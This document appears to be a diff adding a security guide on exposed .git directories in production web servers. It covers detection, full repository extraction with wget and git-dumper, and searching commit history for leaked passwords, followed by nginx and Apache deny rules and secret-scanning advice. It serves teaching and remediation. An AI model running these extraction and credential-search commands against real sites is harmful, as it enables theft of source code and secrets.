@@ -1,0 +1,153 @@
+# Information Disclosure: Exposed Version Control (.git) in Production
+
+The `.git` folder is a hidden directory initialized by Git to track repository commits, history, user metadata, branches, and object hashes.
+
+If the `.git` directory is inadvertently deployed or left accessible via HTTP (`https://target-website.com/.git/`), attackers can **download the entire source code repository and historical commits**.
+
+---
+
+## 1. Why Is the `.git` Directory Exposed?
+
+This flaw typically happens due to deployment pipeline mistakes:
+- Deploying directly via `git clone` or `git pull` inside the server's public document root (`/var/www/html/`).
+- Missing server configuration rules to deny requests to hidden dotfiles (`.*`).
+
+---
+
+## 2. Practical Investigation & Exploitation
+
+### Step 1: Detect Exposed `.git`
+Begin by requesting the `.git/config` or `.git/HEAD` file in the browser:
+
+```text
+https://target-website.com/.git/config
+```
+
+If the server returns `200 OK` with repository configuration details:
+```ini
+[core]
+	repositoryformatversion = 0
+	filemode = true
+	bare = false
+	logallrefupdates = true
+[remote "origin"]
+	url = https://github.com/company-org/internal-web-app.git
+	fetch = +refs/heads/*:refs/remotes/origin/*
+[branch "main"]
+	remote = origin
+	merge = refs/heads/main
+```
+
+> [!IMPORTANT]
+> This response confirms that the `.git` directory is publicly accessible over the internet!
+
+---
+
+### Step 2: Extracting the Full Repository
+
+Two common methods exist for extracting exposed `.git` directories:
+
+#### Method A: Recursive `wget` (If Directory Listing is Enabled)
+```bash
+wget -r -np -R "index.html*" https://target-website.com/.git/
+```
+
+#### Method B: Specialized Extraction Tools (`git-dumper`)
+When directory listing is disabled, `wget` cannot index hash objects. Attackers use tools like `git-dumper` that parse `index` and `objects` structures:
+
+```bash
+# Install git-dumper
+pip install git-dumper
+
+# Dump repository to a local directory
+git-dumper https://target-website.com/.git/ ./leaked-project-code
+```
+
+After extraction, open the folder in your code editor:
+```bash
+cd ./leaked-project-code
+ls -la
+```
+The entire codebase is reconstructed just as it existed in development!
+
+---
+
+### Step 3: Auditing Commit History & Leaked Credentials
+
+A very common mistake developers make is **committing a secret, then removing it in a subsequent commit**. 
+
+Even if the latest branch is clean, Git's history preserves committed credentials permanently unless purged with rewrite tools!
+
+```bash
+# Review commit log diffs
+git log -p
+
+# Search for specific strings in commit history
+git log -S "password" -p
+git log -S "API_KEY" -p
+```
+
+Sample vulnerable commit diff:
+```diff
+commit a4f8b912c3008000f6b34e5400930084
+Author: developer <dev@internal.local>
+Date:   Mon Jan 12 14:20:10 2026 +0700
+
+    Remove hardcoded production database credentials
+
+diff --git a/config/database.js b/config/database.js
+index 8e45a2b..3c11d04 100644
+--- a/config/database.js
++++ b/config/database.js
+@@ -1,6 +1,6 @@
+ module.exports = {
+   host: process.env.DB_HOST,
+-  password: "SuperSecretProductionPassword!2026",
++  password: process.env.DB_PASSWORD,
+   user: process.env.DB_USER,
+ };
+```
+
+> [!CAUTION]
+> Using `git log -p`, the removed production database password is recovered directly from commit history.
+
+---
+
+## 3. Severity Assessment (HIGH / CRITICAL)
+
+Exposed `.git` directories are consistently rated **High** to **Critical** in bug bounty programs:
+1. **Full Source Code Exposure:** Exposes business logic, proprietary algorithms, and internal routing.
+2. **Historical Credentials:** Reveals API keys, database credentials, and cloud tokens across all past commits.
+3. **Zero-Day Discovery:** Enables attackers to search offline for backend vulnerabilities.
+
+---
+
+## 4. Prevention & Remediation (Best Practices)
+
+### 1. Deny Hidden Files (`.*`) in Web Server Configuration
+Ensure your web server rejects requests to hidden dotfiles:
+
+**Nginx Configuration:**
+```nginx
+# Deny access to hidden dotfiles (.git, .env, .htaccess, etc.)
+location ~ /\.(?!well-known) {
+    deny all;
+    access_log off;
+    log_not_found off;
+    return 404;
+}
+```
+
+**Apache Configuration (`.htaccess` or `httpd.conf`):**
+```apache
+<DirectoryMatch "^\.|\/\.">
+    Order allow,deny
+    Deny from all
+</DirectoryMatch>
+```
+
+### 2. Modern CI/CD Deployment
+Never run `git clone` inside public production document roots. Deploy compiled artifacts or container images that include only production build directories (`dist/` or `build/`).
+
+### 3. Automated Secret Scanning
+Integrate tools like `gitleaks` or `trufflehog` into pre-commit hooks and CI/CD pipelines to prevent secret commits from ever entering version control.
